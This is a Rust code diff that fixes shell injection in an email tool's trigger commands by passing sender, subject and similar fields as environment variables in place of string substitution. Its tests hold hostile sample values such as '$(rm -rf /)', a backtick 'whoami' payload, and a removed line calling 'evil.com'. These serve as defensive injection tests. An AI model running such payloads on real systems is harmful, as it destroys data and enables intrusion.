@@ -1,7 +1,5 @@
 use crate::config::{MailboxConfig, MatchFilter, OnReceiveRule};
 use crate::frontmatter::InboundFrontmatter;
-use shell_escape::escape;
-use std::borrow::Cow;
 use std::path::Path;
 use std::process::Command;
 
@@ -10,22 +8,25 @@ pub struct TriggerContext<'a> {
     pub metadata: &'a InboundFrontmatter,
 }
 
-fn shell_escape_value(val: &str) -> String {
-    escape(Cow::Borrowed(val)).into_owned()
-}
+/// Placeholders rejected in `on_receive.cmd` at config-load time. Pre-launch,
+/// the shell-injection fix in S44-1 drops string substitution for
+/// user-controlled fields (`{from}`, `{subject}`, `{to}`, `{mailbox}`,
+/// `{filepath}`) and surfaces them as `AIMX_*` env vars instead. Keeping
+/// legacy placeholders working would reintroduce the injection; refusing to
+/// load is the safer break.
+pub const LEGACY_PLACEHOLDERS: &[&str] =
+    &["{from}", "{subject}", "{to}", "{mailbox}", "{filepath}"];
 
+/// Expand the aimx-controlled `{id}` and `{date}` placeholders. Every
+/// user-controlled field (`{from}`, `{subject}`, `{to}`, `{mailbox}`,
+/// `{filepath}`) is deliberately **not** substituted — those are passed to
+/// the trigger shell via `AIMX_*` env vars by [`execute_triggers`], which
+/// the shell expands safely even for hostile payloads. `{id}` and `{date}`
+/// are opaque aimx-generated strings (hex and ISO-8601), safe to splice.
 pub fn substitute_template(command: &str, ctx: &TriggerContext) -> String {
     command
-        .replace(
-            "{filepath}",
-            &shell_escape_value(&ctx.filepath.to_string_lossy()),
-        )
-        .replace("{from}", &shell_escape_value(&ctx.metadata.from))
-        .replace("{to}", &shell_escape_value(&ctx.metadata.to))
-        .replace("{subject}", &shell_escape_value(&ctx.metadata.subject))
-        .replace("{mailbox}", &shell_escape_value(&ctx.metadata.mailbox))
-        .replace("{id}", &shell_escape_value(&ctx.metadata.id))
-        .replace("{date}", &shell_escape_value(&ctx.metadata.date))
+        .replace("{id}", &ctx.metadata.id)
+        .replace("{date}", &ctx.metadata.date)
 }
 
 pub fn matches_filter(filter: &MatchFilter, metadata: &InboundFrontmatter) -> bool {
@@ -128,7 +129,22 @@ pub fn execute_triggers(mailbox_config: &MailboxConfig, ctx: &TriggerContext) {
 
         let expanded = substitute_template(&rule.command, ctx);
 
-        match Command::new("sh").arg("-c").arg(&expanded).output() {
+        // User-controlled fields ride on env vars, NOT string substitution.
+        // The shell expands `$AIMX_FROM` literally — attacker-controlled
+        // payload in `From:` can no longer break out of quotes, add extra
+        // commands, or exploit `$()`/backticks.
+        let filepath = ctx.filepath.to_string_lossy().into_owned();
+        let mut command = Command::new("sh");
+        command
+            .arg("-c")
+            .arg(&expanded)
+            .env("AIMX_FROM", &ctx.metadata.from)
+            .env("AIMX_SUBJECT", &ctx.metadata.subject)
+            .env("AIMX_TO", &ctx.metadata.to)
+            .env("AIMX_MAILBOX", &ctx.metadata.mailbox)
+            .env("AIMX_FILEPATH", &filepath);
+
+        match command.output() {
             Ok(output) => {
                 if !output.status.success() {
                     let stderr = String::from_utf8_lossy(&output.stderr);
@@ -143,6 +159,57 @@ pub fn execute_triggers(mailbox_config: &MailboxConfig, ctx: &TriggerContext) {
             }
         }
     }
+}
+
+/// Error type returned by [`validate_on_receive_commands`] when a config
+/// contains a legacy placeholder that was dropped by S44-1.
+#[derive(Debug)]
+pub struct LegacyPlaceholderError {
+    pub mailbox: String,
+    pub placeholder: String,
+}
+
+impl std::fmt::Display for LegacyPlaceholderError {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        write!(
+            f,
+            "mailbox '{}': legacy placeholder '{}' in on_receive.command is no longer supported. \
+             Migrate to AIMX_* env vars: replace '{{from}}' with \"$AIMX_FROM\", \
+             '{{subject}}' with \"$AIMX_SUBJECT\", '{{to}}' with \"$AIMX_TO\", \
+             '{{mailbox}}' with \"$AIMX_MAILBOX\", '{{filepath}}' with \"$AIMX_FILEPATH\". \
+             The aimx-controlled placeholders {{id}} and {{date}} still work. \
+             See book/channel-recipes.md for updated examples.",
+            self.mailbox, self.placeholder
+        )
+    }
+}
+
+impl std::error::Error for LegacyPlaceholderError {}
+
+/// Scan every `on_receive.command` in the config for legacy user-controlled
+/// placeholders. Returns the first offender so the operator can fix
+/// mailboxes one at a time.
+pub fn validate_on_receive_commands(
+    mailboxes: &std::collections::HashMap<String, MailboxConfig>,
+) -> Result<(), LegacyPlaceholderError> {
+    // Sort keys so the error is deterministic when multiple mailboxes are
+    // broken — stable ordering keeps CI logs and test expectations sane.
+    let mut names: Vec<&String> = mailboxes.keys().collect();
+    names.sort();
+    for name in names {
+        let mailbox = &mailboxes[name];
+        for rule in &mailbox.on_receive {
+            for placeholder in LEGACY_PLACEHOLDERS {
+                if rule.command.contains(placeholder) {
+                    return Err(LegacyPlaceholderError {
+                        mailbox: name.clone(),
+                        placeholder: (*placeholder).to_string(),
+                    });
+                }
+            }
+        }
+    }
+    Ok(())
 }
 
 #[cfg(test)]
@@ -187,7 +254,10 @@ mod tests {
     }
 
     #[test]
-    fn substitute_all_variables() {
+    fn substitute_only_id_and_date() {
+        // S44-1: string substitution is restricted to aimx-controlled fields.
+        // Every user-controlled placeholder must pass through untouched so
+        // the shell never sees attacker-controlled bytes as code.
         let meta = sample_metadata();
         let filepath = PathBuf::from("/var/lib/aimx/catchall/2025-06-01-001.md");
         let ctx = sample_ctx(&filepath, &meta);
@@ -196,27 +266,54 @@ mod tests {
             "echo {filepath} {from} {to} {subject} {mailbox} {id} {date}",
             &ctx,
         );
-        assert!(result.contains("/var/lib/aimx/catchall/2025-06-01-001.md"));
-        assert!(result.contains("alice@gmail.com"));
-        assert!(result.contains("agent@test.com"));
-        assert!(result.contains("'Hello World'"));
-        assert!(result.contains("catchall"));
-        assert!(result.contains("2025-06-01-001"));
-        assert!(result.contains("2025-06-01T12:00:00Z"));
+        assert!(
+            result.contains("2025-06-01-001"),
+            "{{id}} must expand: {result}"
+        );
+        assert!(
+            result.contains("2025-06-01T12:00:00Z"),
+            "{{date}} must expand: {result}"
+        );
+        // Legacy placeholders MUST remain literal in the expanded script —
+        // the config loader refuses configs that carry them, but the
+        // substitute_template function itself simply leaves them alone.
+        assert!(
+            result.contains("{filepath}"),
+            "{{filepath}} must NOT be substituted: {result}"
+        );
+        assert!(
+            result.contains("{from}"),
+            "{{from}} must NOT be substituted: {result}"
+        );
+        assert!(
+            result.contains("{to}"),
+            "{{to}} must NOT be substituted: {result}"
+        );
+        assert!(
+            result.contains("{subject}"),
+            "{{subject}} must NOT be substituted: {result}"
+        );
+        assert!(
+            result.contains("{mailbox}"),
+            "{{mailbox}} must NOT be substituted: {result}"
+        );
     }
 
     #[test]
-    fn substitute_special_characters_in_values() {
+    fn substitute_leaves_legacy_placeholders_literal() {
+        // Paranoid repro of the T8 bug from the 2026-04-17 manual test run:
+        // a `From:` with a display name + angle brackets would previously
+        // leak unescaped into the shell.
         let mut meta = sample_metadata();
-        meta.from = "O'Brien <obrien@test.com>".to_string();
+        meta.from = "U-Zyn Chua <chua@uzyn.com>".to_string();
         meta.subject = "Re: \"urgent\" & important".to_string();
         let filepath = PathBuf::from("/tmp/test.md");
         let ctx = sample_ctx(&filepath, &meta);
 
         let result = substitute_template("echo {from} {subject}", &ctx);
-        assert!(result.contains("obrien@test.com"));
-        assert!(result.contains("urgent"));
-        assert!(!result.contains("O'Brien <obrien@test.com>"));
+        // The substitute step does not touch these — the env-var path is
+        // what safely delivers them to the shell.
+        assert_eq!(result, "echo {from} {subject}");
     }
 
     #[test]
@@ -573,7 +670,11 @@ mod tests {
     }
 
     #[test]
-    fn execute_triggers_with_template_variables() {
+    fn execute_triggers_with_env_vars() {
+        // S44-1: the env-var path is now how user-controlled values reach
+        // the trigger shell. `$AIMX_FROM` / `$AIMX_SUBJECT` expand inside
+        // double quotes, so whitespace and metacharacters are preserved but
+        // never interpreted as shell code.
         let tmp = tempfile::TempDir::new().unwrap();
         let output_file = tmp.path().join("output.txt");
         let meta = sample_metadata();
@@ -587,7 +688,7 @@ mod tests {
             on_receive: vec![OnReceiveRule {
                 rule_type: "cmd".to_string(),
                 command: format!(
-                    "echo {{from}} {{subject}} > {}",
+                    "printf '%s %s\\n' \"$AIMX_FROM\" \"$AIMX_SUBJECT\" > {}",
                     output_file.to_string_lossy()
                 ),
                 r#match: None,
@@ -596,8 +697,231 @@ mod tests {
 
         execute_triggers(&config, &ctx);
         let content = std::fs::read_to_string(&output_file).unwrap();
-        assert!(content.contains("alice@gmail.com"));
-        assert!(content.contains("Hello World"));
+        assert!(content.contains("alice@gmail.com"), "got: {content:?}");
+        assert!(content.contains("Hello World"), "got: {content:?}");
+    }
+
+    /// Helper: fire a single-shot trigger that writes `$AIMX_*` env vars to
+    /// a log file. Used by the injection-attempt tests below to verify the
+    /// hostile payload is preserved verbatim (i.e. no command was executed
+    /// and no escape sequence was interpreted).
+    fn run_env_capture_trigger(
+        mut meta_mutator: impl FnMut(&mut InboundFrontmatter),
+    ) -> (tempfile::TempDir, String) {
+        let tmp = tempfile::TempDir::new().unwrap();
+        let log = tmp.path().join("env.log");
+        let mut meta = sample_metadata();
+        meta_mutator(&mut meta);
+        let filepath = tmp.path().join("test.md");
+        let ctx = sample_ctx(&filepath, &meta);
+
+        let config = MailboxConfig {
+            address: "*@test.com".to_string(),
+            trust: "none".to_string(),
+            trusted_senders: vec![],
+            on_receive: vec![OnReceiveRule {
+                rule_type: "cmd".to_string(),
+                command: format!(
+                    "printf 'FROM=%s\\nSUBJECT=%s\\nTO=%s\\nMAILBOX=%s\\nFILEPATH=%s\\n' \
+                     \"$AIMX_FROM\" \"$AIMX_SUBJECT\" \"$AIMX_TO\" \"$AIMX_MAILBOX\" \"$AIMX_FILEPATH\" > {}",
+                    log.to_string_lossy()
+                ),
+                r#match: None,
+            }],
+        };
+        execute_triggers(&config, &ctx);
+        let content = std::fs::read_to_string(&log).unwrap();
+        (tmp, content)
+    }
+
+    #[test]
+    fn env_var_preserves_angle_bracket_from() {
+        // T8 repro: `U-Zyn Chua <chua@uzyn.com>`. Previously this broke
+        // shell-escape quoting on the substitution path. With env-vars, the
+        // payload lands verbatim — no redirection, no execution.
+        let (_tmp, content) = run_env_capture_trigger(|m| {
+            m.from = "U-Zyn Chua <chua@uzyn.com>".to_string();
+        });
+        assert!(
+            content.contains("FROM=U-Zyn Chua <chua@uzyn.com>"),
+            "got: {content:?}"
+        );
+    }
+
+    #[test]
+    fn env_var_preserves_backtick_injection() {
+        let (_tmp, content) = run_env_capture_trigger(|m| {
+            m.from = "`whoami`@attacker.com".to_string();
+        });
+        assert!(
+            content.contains("FROM=`whoami`@attacker.com"),
+            "backticks must land verbatim, not execute: {content:?}"
+        );
+    }
+
+    #[test]
+    fn env_var_preserves_dollar_paren_injection() {
+        let (_tmp, content) = run_env_capture_trigger(|m| {
+            m.subject = "$(rm -rf /)".to_string();
+        });
+        assert!(
+            content.contains("SUBJECT=$(rm -rf /)"),
+            "$(..) must land verbatim: {content:?}"
+        );
+    }
+
+    #[test]
+    fn env_var_preserves_semicolon_command() {
+        let (_tmp, content) = run_env_capture_trigger(|m| {
+            m.subject = "foo; ls".to_string();
+        });
+        assert!(
+            content.contains("SUBJECT=foo; ls"),
+            "semicolons must land verbatim: {content:?}"
+        );
+    }
+
+    #[test]
+    fn env_var_preserves_newline_subject() {
+        let (_tmp, content) = run_env_capture_trigger(|m| {
+            m.subject = "foo\nbar".to_string();
+        });
+        // Newlines embed via env var (execve preserves them). The shell's
+        // `printf '%s'` writes them verbatim — so we assert on both halves.
+        assert!(content.contains("SUBJECT=foo"), "got: {content:?}");
+        assert!(content.contains("bar"), "got: {content:?}");
+    }
+
+    #[test]
+    fn env_var_preserves_mixed_quotes() {
+        let (_tmp, content) = run_env_capture_trigger(|m| {
+            m.subject = "O'Brien says \"hi\"".to_string();
+        });
+        assert!(
+            content.contains("SUBJECT=O'Brien says \"hi\""),
+            "got: {content:?}"
+        );
+    }
+
+    #[test]
+    fn env_var_injection_does_not_execute_marker_command() {
+        // Integration-level repro: if the attacker could sneak `$(...)`
+        // into the command via `{subject}` substitution, a marker file
+        // would appear. Env-var expansion under the shell preserves the
+        // literal string, so nothing executes.
+        let tmp = tempfile::TempDir::new().unwrap();
+        let marker = tmp.path().join("pwned");
+        let mut meta = sample_metadata();
+        meta.subject = format!("$(touch {})", marker.to_string_lossy());
+        let filepath = tmp.path().join("test.md");
+        let ctx = sample_ctx(&filepath, &meta);
+
+        let config = MailboxConfig {
+            address: "*@test.com".to_string(),
+            trust: "none".to_string(),
+            trusted_senders: vec![],
+            on_receive: vec![OnReceiveRule {
+                rule_type: "cmd".to_string(),
+                // Deliberately echo the env var so the payload reaches the
+                // shell via the safe path. The `$(...)` inside $AIMX_SUBJECT
+                // must NOT execute.
+                command: "echo \"$AIMX_SUBJECT\" > /dev/null".to_string(),
+                r#match: None,
+            }],
+        };
+
+        execute_triggers(&config, &ctx);
+        assert!(
+            !marker.exists(),
+            "env-var payload MUST NOT be interpreted as shell code"
+        );
+    }
+
+    #[test]
+    fn validate_on_receive_rejects_legacy_from() {
+        use std::collections::HashMap;
+        let mut mailboxes = HashMap::new();
+        mailboxes.insert(
+            "support".to_string(),
+            MailboxConfig {
+                address: "support@test.com".to_string(),
+                trust: "none".to_string(),
+                trusted_senders: vec![],
+                on_receive: vec![OnReceiveRule {
+                    rule_type: "cmd".to_string(),
+                    command: "echo {from}".to_string(),
+                    r#match: None,
+                }],
+            },
+        );
+        let err = validate_on_receive_commands(&mailboxes).unwrap_err();
+        assert_eq!(err.mailbox, "support");
+        assert_eq!(err.placeholder, "{from}");
+        let msg = err.to_string();
+        assert!(msg.contains("support"), "mailbox named: {msg}");
+        assert!(msg.contains("{from}"), "placeholder named: {msg}");
+        assert!(msg.contains("AIMX_FROM"), "migration hinted: {msg}");
+    }
+
+    #[test]
+    fn validate_on_receive_rejects_legacy_filepath() {
+        use std::collections::HashMap;
+        let mut mailboxes = HashMap::new();
+        mailboxes.insert(
+            "ops".to_string(),
+            MailboxConfig {
+                address: "ops@test.com".to_string(),
+                trust: "none".to_string(),
+                trusted_senders: vec![],
+                on_receive: vec![OnReceiveRule {
+                    rule_type: "cmd".to_string(),
+                    command: "cat {filepath}".to_string(),
+                    r#match: None,
+                }],
+            },
+        );
+        let err = validate_on_receive_commands(&mailboxes).unwrap_err();
+        assert_eq!(err.placeholder, "{filepath}");
+    }
+
+    #[test]
+    fn validate_on_receive_accepts_id_and_date() {
+        use std::collections::HashMap;
+        let mut mailboxes = HashMap::new();
+        mailboxes.insert(
+            "log".to_string(),
+            MailboxConfig {
+                address: "log@test.com".to_string(),
+                trust: "none".to_string(),
+                trusted_senders: vec![],
+                on_receive: vec![OnReceiveRule {
+                    rule_type: "cmd".to_string(),
+                    command: "echo id={id} date={date}".to_string(),
+                    r#match: None,
+                }],
+            },
+        );
+        assert!(validate_on_receive_commands(&mailboxes).is_ok());
+    }
+
+    #[test]
+    fn validate_on_receive_accepts_env_var_recipe() {
+        use std::collections::HashMap;
+        let mut mailboxes = HashMap::new();
+        mailboxes.insert(
+            "inbox".to_string(),
+            MailboxConfig {
+                address: "inbox@test.com".to_string(),
+                trust: "none".to_string(),
+                trusted_senders: vec![],
+                on_receive: vec![OnReceiveRule {
+                    rule_type: "cmd".to_string(),
+                    command: "echo \"$AIMX_FROM\" \"$AIMX_SUBJECT\"".to_string(),
+                    r#match: None,
+                }],
+            },
+        );
+        assert!(validate_on_receive_commands(&mailboxes).is_ok());
     }
 
     #[test]
@@ -755,52 +1079,6 @@ mod tests {
         assert!(
             marker.exists(),
             "Trigger should fire for DKIM pass with trust=verified"
-        );
-    }
-
-    #[test]
-    fn substitute_template_escapes_shell_metacharacters() {
-        let mut meta = sample_metadata();
-        meta.subject = "$(rm -rf /)".to_string();
-        meta.from = "`curl evil.com`@attacker.com".to_string();
-        let filepath = PathBuf::from("/tmp/test.md");
-        let ctx = sample_ctx(&filepath, &meta);
-
-        let result = substitute_template("echo {from} {subject}", &ctx);
-        assert!(
-            result.contains("'$(rm -rf /)'"),
-            "command substitution should be single-quoted: {result}"
-        );
-        assert!(
-            result.contains("'`curl evil.com`@attacker.com'"),
-            "backtick injection should be single-quoted: {result}"
-        );
-    }
-
-    #[test]
-    fn substitute_template_shell_injection_does_not_execute() {
-        let tmp = tempfile::TempDir::new().unwrap();
-        let marker = tmp.path().join("pwned");
-        let mut meta = sample_metadata();
-        meta.subject = format!("$(touch {})", marker.to_string_lossy());
-        let filepath = tmp.path().join("test.md");
-        let ctx = sample_ctx(&filepath, &meta);
-
-        let config = MailboxConfig {
-            address: "*@test.com".to_string(),
-            trust: "none".to_string(),
-            trusted_senders: vec![],
-            on_receive: vec![OnReceiveRule {
-                rule_type: "cmd".to_string(),
-                command: "echo {subject}".to_string(),
-                r#match: None,
-            }],
-        };
-
-        execute_triggers(&config, &ctx);
-        assert!(
-            !marker.exists(),
-            "Shell injection should not execute commands"
         );
     }
 
